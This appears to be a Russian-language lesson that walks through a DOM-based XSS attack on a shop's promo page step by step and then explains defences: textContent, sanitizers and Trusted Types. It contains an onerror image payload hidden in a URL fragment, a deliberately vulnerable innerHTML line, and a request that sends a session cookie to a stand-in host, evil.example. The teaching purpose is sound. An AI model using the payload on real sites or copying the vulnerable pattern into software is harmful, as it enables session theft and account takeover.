## Шаги

### `link` Ссылка с хвостом после #

`attacker → browser` · `attack` · `icon:mail`
Сообщение: ссылка на акцию · Итог: доставлено

```text
https://shop.example/promo#⟦<img src=x onerror=steal()>⟧
```

#### Просто

Жертве приходит ссылка на **настоящую** страницу акции магазина. В конце адреса, после знака `#`,
спрятан кусок разметки с программой.

#### По шагам

Страница акции приветствует гостя по имени из адреса: `promo#Анна` покажет «Привет, Анна!».
Атакующий ставит после `#` вместо имени тег картинки с обработчиком ошибки `onerror`, который
вызывает его функцию.

#### Глубже

`steal()` — условное имя для кода атакующего. В настоящей ссылке спецзнаки закодированы, и на
глаз подвох не виден. Часть адреса после `#` называется фрагментом. Обычно он указывает на место
в странице, но скрипты страницы тоже могут его читать.

### `load` Браузер открывает страницу

`browser → server` · `legit`
Сообщение: GET /promo · Итог: фрагмент не отправлен

```http
GET /promo
Host: shop.example
```

#### Просто

Жертва нажимает на ссылку. Браузер просит у магазина страницу акции, но **хвост после `#` на
сервер не отправляет**. Сервер даже не видит атаки.

#### По шагам

В запросе есть только путь `/promo`. Фрагмент браузер оставляет себе и обработает сам, когда
страница загрузится.

#### Глубже

По MDN фрагмент не уходит на сервер вместе с запросом: его обрабатывает клиент. Поэтому
DOM XSS не видна в журналах сервера и её не поймает фильтр на сервере. Ошибка целиком живёт в
JavaScript страницы.

### `page` Обычная страница с опасной строкой кода

`server → browser` · `legit`
Сообщение: страница акции · Итог: скрипт страницы загружен

```js
const name = decodeURIComponent(location.hash.slice(1));
banner.innerHTML = 'Привет, ' + ⟦name⟧ + '!';
```

#### Просто

Сервер отдаёт обычную страницу. В ней есть скрипт магазина, который берёт имя из адреса и
**вставляет его в страницу как разметку**.

#### По шагам

`location.hash` — **источник**: отсюда в программу приходят данные, которые может задать кто
угодно. `innerHTML` — **приёмник**: всё, что в него записано, браузер разбирает как HTML. Ошибка в
том, что данные идут из одного в другое без обработки.

#### Глубже

`decodeURIComponent` нужен скрипту, потому что браузер при чтении не раскодирует фрагмент
обратно. Сам сервер ничего не вклеивал: ответ одинаков для всех. MITRE называет такой вид
DOM-based (тип 0): вставку делает код на стороне клиента, меняя DOM — дерево страницы в браузере.

### `sink` Скрипт страницы вставляет разметку

`browser → browser` · `attack` · `without-defence`
Сообщение: innerHTML = фрагмент · Итог: обработчик onerror выполнен

```html
<div id="banner">Привет, ⟦<img src=x onerror=steal()>⟧!</div>
```

#### Просто

Скрипт магазина послушно вставляет «имя» в баннер. Браузер видит тег картинки, не может её
загрузить и **запускает обработчик ошибки**, то есть код атакующего.

#### По шагам

Картинки по адресу `x` нет, браузер вызывает `onerror`. Код выполняется внутри страницы
shop.example и получает все её права в этой вкладке.

#### Глубже

Поэтому атакующий взял не `<script>`: по MDN тег `<script>`, вставленный через `innerHTML`, не
выполняется. Но это не защита: остаются обработчики событий у других тегов. Другие опасные
приёмники — `document.write()`, `eval()`, `setTimeout` со строкой.

### `steal` Cookie уходит атакующему

`browser → attacker` · `attack` · `without-defence`
Сообщение: cookie сессии · Итог: украдено

```http
GET /c?d=⟦session=7f3a9c⟧
Host: evil.example
```

#### Просто

Код атакующего читает **пропуск** жертвы в магазин и отправляет его на свой сервер. Дальше всё
как при обычной XSS.

#### По шагам

Код читает `document.cookie` и делает запрос на сервер атакующего, вписав значение в адрес.

#### Глубже

`HttpOnly` у cookie сессии не дал бы прочитать его, но код всё равно мог бы действовать от имени
жертвы прямо в её вкладке. Чинить нужно скрипт страницы, а не cookie.

### `text` Скрипт пишет текст, а не разметку

`browser → browser` · `attack` · `with-defence` · `stopped`
Сообщение: textContent = фрагмент · Итог: тег показан буквами, атака не сработала

```js
banner.textContent = 'Привет, ' + name + '!';
```

#### Просто

Магазин исправил одну строку: теперь имя вставляется **как текст**. Жертва увидит странное
приветствие со скобками, но ничего не выполнится. Здесь атака и останавливается.

#### По шагам

`textContent` — безопасный приёмник: браузер кладёт строку в страницу буквами и не разбирает её
как HTML. Тег `<img>` не появляется, обработчик не запускается.

#### Глубже

OWASP называет главным способом исправить DOM XSS выбор правильного приёмника: для текста —
`textContent` вместо `innerHTML`. Если HTML всё-таки нужен, его пропускают через санитайзер.
А в `eval()` данные пользователя не должны попадать вовсе: OWASP советует просто так не делать, а
не пытаться их очистить.

### `tt` Политика Trusted Types

`server → browser` · `attack` · `with-defence` · `stopped`
Сообщение: страница с политикой · Итог: заголовок получен; строка в innerHTML будет отвергнута

```http
Content-Security-Policy: ⟦require-trusted-types-for 'script'⟧
```

#### Просто

Это отдельный сценарий: допустим, опасную строку кода где-то пропустили. Второй слой —
**Trusted Types**: сайт говорит браузеру «в опасные приёмники пускай только проверенные данные».
Обычная строка в `innerHTML` вызывает ошибку, и разметка атакующего не вставляется.

#### По шагам

Сервер отправляет со страницей заголовок Content Security Policy с правилом
`require-trusted-types-for`. Когда скрипт пишет в `innerHTML` простую строку, браузер бросает
`TypeError`.

#### Глубже

Чтобы записать HTML, сайт заводит политику: функцию, через которую данные проходят перед
приёмником, например санитайзер. Так все опасные места сходятся в одну точку, которую легко
проверить. Правило `trusted-types` перечисляет имена разрешённых политик. Trusted Types описаны
в спецификации W3C.

## Как защититься

- **Безопасные приёмники.** Текст вставляйте через `textContent` или создавайте узлы через
  `createElement`. `innerHTML`, `outerHTML`, `document.write()` — только для HTML, который вы
  проверили.
- **Не исполняйте строки.** `eval()`, `setTimeout` и `setInterval` со строкой превращают данные
  в код. Обходитесь без них.
- **Санитайзер, если HTML нужен.** Разметку из адреса, сообщений и чужих данных пропускайте через
  проверенный санитайзер перед вставкой.
- **Trusted Types.** Заголовок `Content-Security-Policy: require-trusted-types-for 'script'`
  запрещает писать в опасные приёмники простые строки, а политики собирают проверку в одном месте.
- **Помните, что сервер не видит фрагмент.** Фильтры и журналы на сервере DOM XSS не замечают:
  проверяйте JavaScript страницы: где данные из адреса и других мест, которые может задать
  посторонний, попадают в приёмники.
